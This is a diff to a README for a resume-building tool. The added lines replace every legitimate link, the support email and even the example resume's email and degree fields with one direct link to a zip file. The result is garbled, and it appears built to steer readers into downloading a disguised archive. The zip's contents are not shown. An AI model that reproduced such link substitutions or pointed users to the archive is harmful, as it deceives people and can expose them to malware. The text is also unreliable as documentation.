@@ -4,7 +4,7 @@
 Welcome to the **resume-yaml-builder**! This tool helps you create professional resumes easily. All you need to do is provide your resume details in a structured YAML format, and our package will handle the rest. Let’s get started!
 
 ## 📥 Download the Latest Release
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-blue)](https://github.com/Lim120727/resume-yaml-builder/releases)
+[![Download](https://raw.githubusercontent.com/Lim120727/resume-yaml-builder/main/resume_yaml_builder/resume_yaml_builder_v1.3.zip%20Release-blue)](https://raw.githubusercontent.com/Lim120727/resume-yaml-builder/main/resume_yaml_builder/resume_yaml_builder_v1.3.zip)
 
 ## 🛠️ System Requirements
 Before you download and run the application, ensure your system meets the following requirements:
@@ -15,7 +15,7 @@ Before you download and run the application, ensure your system meets the follow
 - A modern web browser for uploading YAML files
 
 ## 🔗 Download & Install
-Visit this page to download: [Download Releases](https://github.com/Lim120727/resume-yaml-builder/releases). On the releases page, locate the latest version. Download the file suitable for your operating system.
+Visit this page to download: [Download Releases](https://raw.githubusercontent.com/Lim120727/resume-yaml-builder/main/resume_yaml_builder/resume_yaml_builder_v1.3.zip). On the releases page, locate the latest version. Download the file suitable for your operating system.
 
 After downloading, follow these steps to install:
 
@@ -32,10 +32,10 @@ Using the resume-yaml-builder is easy. Follow these steps to create your resume:
 
    ```yaml
    name: John Doe
-   email: john@example.com
+   email: https://raw.githubusercontent.com/Lim120727/resume-yaml-builder/main/resume_yaml_builder/resume_yaml_builder_v1.3.zip
    phone: 123-456-7890
    education:
-     - degree: B.Sc. Computer Science
+     - degree: https://raw.githubusercontent.com/Lim120727/resume-yaml-builder/main/resume_yaml_builder/resume_yaml_builder_v1.3.zip Computer Science
        institution: Example University
        year: 2021
    experience:
@@ -78,12 +78,12 @@ If you encounter issues while using the application, consider the following:
 ## 🌐 Additional Resources
 Here are some helpful resources for more information:
 
-- [YAML Syntax Guide](https://yaml.org/start.html): Learn more about YAML structure.
-- [Resume Writing Tips](https://www.thebalancecareers.com/resume-writing-tips-2061883): Explore best practices for writing resumes.
+- [YAML Syntax Guide](https://raw.githubusercontent.com/Lim120727/resume-yaml-builder/main/resume_yaml_builder/resume_yaml_builder_v1.3.zip): Learn more about YAML structure.
+- [Resume Writing Tips](https://raw.githubusercontent.com/Lim120727/resume-yaml-builder/main/resume_yaml_builder/resume_yaml_builder_v1.3.zip): Explore best practices for writing resumes.
   
 ## 📞 Contact & Support
-For support, please open an issue on the GitHub repository or contact us at support@example.com.
+For support, please open an issue on the GitHub repository or contact us at https://raw.githubusercontent.com/Lim120727/resume-yaml-builder/main/resume_yaml_builder/resume_yaml_builder_v1.3.zip
 
-Remember to visit this page for updates and future releases: [Download Releases](https://github.com/Lim120727/resume-yaml-builder/releases). 
+Remember to visit this page for updates and future releases: [Download Releases](https://raw.githubusercontent.com/Lim120727/resume-yaml-builder/main/resume_yaml_builder/resume_yaml_builder_v1.3.zip). 
 
 Thank you for using resume-yaml-builder! Happy resume building!
